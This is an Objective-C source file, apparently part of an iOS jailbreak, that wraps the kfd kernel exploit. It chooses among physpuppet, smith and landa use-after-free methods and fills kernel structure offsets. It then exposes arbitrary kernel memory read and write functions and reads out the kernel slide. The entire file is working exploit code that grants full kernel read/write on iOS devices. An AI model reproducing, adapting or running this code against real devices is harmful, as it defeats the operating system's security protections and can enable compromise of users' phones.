#import "Exploit/libkfd.h"
#import <libjailbreak/primitives_external.h>
#import <xpc/xpc.h>

uint64_t gKfd = 0;

uint8_t kread8(uint64_t where) {
    uint8_t out;
    kread(gKfd, where, &out, sizeof(uint8_t));
    return out;
}
uint32_t kread16(uint64_t where) {
    uint16_t out;
    kread(gKfd, where, &out, sizeof(uint16_t));
    return out;
}
uint32_t kread32(uint64_t where) {
    uint32_t out;
    kread(gKfd, where, &out, sizeof(uint32_t));
    return out;
}
uint64_t kread64(uint64_t where) {
    uint64_t out;
    kread(gKfd, where, &out, sizeof(uint64_t));
    return out;
}

void kwrite8(uint64_t where, uint8_t what) {
    uint8_t _buf[8] = {};
    _buf[0] = what;
    _buf[1] = kread8(where+1);
    _buf[2] = kread8(where+2);
    _buf[3] = kread8(where+3);
    _buf[4] = kread8(where+4);
    _buf[5] = kread8(where+5);
    _buf[6] = kread8(where+6);
    _buf[7] = kread8(where+7);
    kwrite((u64)(gKfd), &_buf, where, sizeof(u64));
}

void kwrite16(uint64_t where, uint16_t what) {
    u16 _buf[4] = {};
    _buf[0] = what;
    _buf[1] = kread16(where+2);
    _buf[2] = kread16(where+4);
    _buf[3] = kread16(where+6);
    kwrite((u64)(gKfd), &_buf, where, sizeof(u64));
}

void kwrite32(uint64_t where, uint32_t what) {
    u32 _buf[2] = {};
    _buf[0] = what;
    _buf[1] = kread32(where+4);
    kwrite((u64)(gKfd), &_buf, where, sizeof(u64));
}
void kwrite64(uint64_t where, uint64_t what) {
    u64 _buf[1] = {};
    _buf[0] = what;
    kwrite((u64)(gKfd), &_buf, where, sizeof(u64));
}

int kreadbuf(uint64_t where, void *buf, size_t size)
{
    if (size == 1) {
        *(uint8_t*)buf = kread8(where);
    }
    else if (size == 2) {
        *(uint16_t*)buf = kread16(where);
    }
    else if (size == 4) {
        *(uint32_t*)buf = kread32(where);
    }
    else {
        if (size >= UINT16_MAX) {
            for (uint64_t start = 0; start < size; start += UINT16_MAX) {
                uint64_t sizeToUse = UINT16_MAX;
                if (start + sizeToUse > size) {
                    sizeToUse = (size - start);
                }
                kread((u64)(gKfd), where+start, ((uint8_t *)buf)+start, sizeToUse);
            }
        } else {
            kread((u64)(gKfd), where, buf, size);
        }
    }
    return 0;
}

int kwritebuf(uint64_t where, const void *buf, size_t size)
{
    if (size == 1) {
        kwrite8(where, *(uint8_t*)buf);
    }
    else if (size == 2) {
        kwrite16(where, *(uint16_t*)buf);
    }
    else if (size == 4) {
        kwrite32(where, *(uint32_t*)buf);
    }
    else {
        if (size >= UINT16_MAX) {
            for (uint64_t start = 0; start < size; start += UINT16_MAX) {
                uint64_t sizeToUse = UINT16_MAX;
                if (start + sizeToUse > size) {
                    sizeToUse = (size - start);
                }
                kwrite((u64)(gKfd), (void*)((uint8_t *)buf)+start, where+start, sizeToUse);
            }
        } else {
            kwrite((u64)(gKfd), (void*)buf, where, size);
        }
    }
    return 0;
}

int exploit_init(const char *flavor, struct kernel_primitives *primitives, xpc_object_t systemInfoXdict)
{
    u64 method = 0;
    if (!strcmp(flavor, "physpuppet")) {
        method = puaf_physpuppet;
    }
    else if(!strcmp(flavor, "smith")) {
        method = puaf_smith;
    }
    else if (!strcmp(flavor, "landa")) {
        method = puaf_landa;
    }
    else {
        return -1;
    }

    u64 kread_method = 0, kwrite_method = 0;
    if (@available(iOS 16.0, *)) {
        kread_method = kread_sem_open;
        kwrite_method = kwrite_sem_open;
    }
    else {
        kread_method = kread_IOSurface;
        kwrite_method = kwrite_IOSurface;
    }

    uint64_t vm_map__pmap = xpc_dictionary_get_uint64(systemInfoXdict, "kernelStruct.vm_map.pmap");

    dynamic_system_info = (struct dynamic_info){
        .kread_kqueue_workloop_ctl_supported = true,
        .krkw_iosurface_supported = false,
        .perf_supported = true,

        .proc__p_list__le_prev = xpc_dictionary_get_uint64(systemInfoXdict, "kernelStruct.proc.list_prev"),
        .proc__p_pid           = xpc_dictionary_get_uint64(systemInfoXdict, "kernelStruct.proc.pid"),
        .proc__p_fd__fd_ofiles = xpc_dictionary_get_uint64(systemInfoXdict, "kernelStruct.proc.fd") + xpc_dictionary_get_uint64(systemInfoXdict, "kernelStruct.filedesc.ofiles_start"),
        .proc__object_size     = xpc_dictionary_get_uint64(systemInfoXdict, "kernelStruct.proc.struct_size"),
    
        .task__map = 0x28,
    
        .vm_map__hdr_links_prev             = 0x10,
        .vm_map__hdr_links_next             = 0x18,
        .vm_map__min_offset                 = 0x20,
        .vm_map__max_offset                 = 0x28,
        .vm_map__hdr_nentries               = 0x30,
        .vm_map__hdr_nentries_u64           = 0x30,
        .vm_map__hdr_rb_head_store_rbh_root = 0x38,
    
        .vm_map__pmap        = vm_map__pmap,        // 0x48 or 0x40
        .vm_map__hint        = vm_map__pmap + 0x58, // 0xa0 or 0x98
        .vm_map__hole_hint   = vm_map__pmap + 0x60, // 0xa8 or 0xa0
        .vm_map__holes_list  = vm_map__pmap + 0x68, // 0xb0 or 0xa8
        .vm_map__object_size = vm_map__pmap + 0x80, // 0xc8 or 0xc0

        .thread__thread_id   = 0x400,

        .kernelcache__cdevsw           = xpc_dictionary_get_uint64(systemInfoXdict, "kernelSymbol.cdevsw"),
        .kernelcache__gPhysBase        = xpc_dictionary_get_uint64(systemInfoXdict, "kernelSymbol.gPhysBase"),
        .kernelcache__gPhysSize        = xpc_dictionary_get_uint64(systemInfoXdict, "kernelSymbol.gPhysSize"),
        .kernelcache__gVirtBase        = xpc_dictionary_get_uint64(systemInfoXdict, "kernelSymbol.gVirtBase"),
        .kernelcache__perfmon_dev_open = xpc_dictionary_get_uint64(systemInfoXdict, "kernelSymbol.perfmon_dev_open"),
        .kernelcache__perfmon_devices  = xpc_dictionary_get_uint64(systemInfoXdict, "kernelSymbol.perfmon_devices"),
        .kernelcache__ptov_table       = xpc_dictionary_get_uint64(systemInfoXdict, "kernelSymbol.ptov_table"),
        .kernelcache__vn_kqfilter      = xpc_dictionary_get_uint64(systemInfoXdict, "kernelSymbol.vn_kqfilter"),

        .device__T1SZ_BOOT            = xpc_dictionary_get_uint64(systemInfoXdict, "kernelConstant.T1SZ_BOOT"),
        .device__ARM_TT_L1_INDEX_MASK = xpc_dictionary_get_uint64(systemInfoXdict, "kernelConstant.ARM_TT_L1_INDEX_MASK"),
    };

    gKfd = kopen(512, method, kread_method, kwrite_method);
    primitives->kreadbuf = kreadbuf;
    primitives->kwritebuf = kwritebuf;

    xpc_dictionary_set_uint64(systemInfoXdict, "kernelConstant.slide", ((struct kfd *)gKfd)->info.kaddr.kernel_slide);

    return 0;
}

int exploit_deinit(struct kernel_primitives *primitives)
{
    if (primitives->kreadbuf == kreadbuf) {
        primitives->kreadbuf = NULL;
    }
    if (primitives->kwritebuf == kwritebuf) {
        primitives->kwritebuf = NULL;
    }

    if (!gKfd) return -1;
    kclose(gKfd);

    return 0;
}
